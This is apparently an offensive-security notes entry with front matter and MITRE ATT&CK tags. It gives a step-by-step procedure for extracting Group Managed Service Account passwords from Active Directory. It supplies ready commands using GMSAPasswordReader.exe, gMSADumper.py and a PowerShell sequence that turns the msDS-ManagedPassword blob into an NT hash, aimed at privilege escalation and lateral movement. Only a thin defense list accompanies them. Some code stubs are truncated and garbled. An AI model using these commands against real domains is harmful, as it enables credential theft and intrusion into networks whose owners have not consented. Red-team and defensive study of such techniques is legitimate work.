---
id: 6f3e2cb4-aaad-411d-894c-837a5f1f4026
name: Extracting GMSA Passwords from Active Directory
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.563782+00:00'
updated_at: '2023-04-10T20:26:38.811261+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Account Manipulation|T1098 - Account Manipulation]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Extract NT hash from the Active Directory]]'
- '[[Reading GMSA Password]]'
commands:
- '[[Convert Managed Password Blob to NT Hash]]'
- '[[Run gMSADumper.py]]'
- '[[Run GMSAPasswordReader.exe]]'
---

# Extracting GMSA Passwords from Active Directory

## Summary

This procedure involves extracting Group Managed Service Account (GMSA) passwords from Active Directory. GMSAs are a type of service account that can be used by multiple hosts within a domain. The passwords for these accounts are stored in Active Directory and can be retrieved using this procedure.

## Description

# Description

This procedure involves extracting Group Managed Service Account (GMSA) passwords from Active Directory. GMSAs are a type of service account that can be used by multiple hosts within a domain. The passwords for these accounts are stored in Active Directory and can be retrieved using this procedure. The attacker can then use these passwords to gain access to other systems within the domain.

To extract the GMSA password, the attacker first dumps Active Directory information to obtain the encrypted password. The attacker then retrieves and decrypts the managed password from the Active Directory service account. This procedure can be used to escalate privileges and move laterally within the network.

 

## Requirements

1. Access to the domain network

1. Authenticated access to Active Directory

1. Tools for dumping Active Directory information and decrypting passwords

 

## Defense

1. Implement strong password policies for GMSAs and other service accounts

1. Monitor Active Directory for suspicious activity, such as changes to GMSA passwords or new GMSAs being created

1. Restrict access to Active Directory to only authorized personnel

 

## Objectives

1. Extract GMSA passwords from Active Directory

1. Escalate privileges and move laterally within the network

 

# Instructions

1. To retrieve the password for a Group Managed Service Account, run the GMSAPasswordReader.exe tool with the --accountname parameter followed by the name of the account.

 



**Code**: [[# https://github.com/rvazarkar/GMSAPasswordReader
]]



> This command retrieves the password for a Group Managed Service Account (GMSA) using the GMSAPasswordReader tool. The --accountname parameter specifies the name of the account for which the password needs to be retrieved. The tool is written in C# and can be found at the provided GitHub repository.



**Command** ([[Run GMSAPasswordReader.exe]]):

```bash
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
```



2. To dump Active Directory information, run the following command:

 



**Code**: [[# https://github.com/micahvandeusen/gMSADumper
pyt]]



> -u: The username to authenticate with.
-p: The password for the specified user.
-d: The domain to connect to.
This command will extract various information from Active Directory and output it to the console.



**Command** ([[Run gMSADumper.py]]):

```bash
python3 gMSADumper.py -u User -p Password1 -d domain.local
```



3. This command retrieves the managed password for the specified Active Directory service account and decrypts it. Replace 'SVC_SERVICE_ACCOUNT' with the name of the service account you want to retrieve the password for.

 



**Code**: [[$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVI]]



> This command uses the Get-ADServiceAccount cmdlet to retrieve the managed password for the specified service account. The msDS-ManagedPassword attribute is retrieved as a byte array and stored in the $blob variable. The ConvertFrom-ADManagedPasswordBlob cmdlet is used to convert the byte array to a ManagedPassword object, which contains the SecureCurrentPassword property that holds the encrypted password. The ConvertTo-NTHash cmdlet is then used to decrypt the password and store it in the $hash1 variable. This command can be useful for retrieving passwords for automation tasks or troubleshooting purposes.



**Command** ([[Convert Managed Password Blob to NT Hash]]):

```bash
$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Account Manipulation|T1098 - Account Manipulation]]
- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Convert Managed Password Blob to NT Hash]]
- [[Run gMSADumper.py]]
- [[Run GMSAPasswordReader.exe]]

## Tags

- [[Active Directory Attacks]]
- [[Extract NT hash from the Active Directory]]
- [[Reading GMSA Password]]


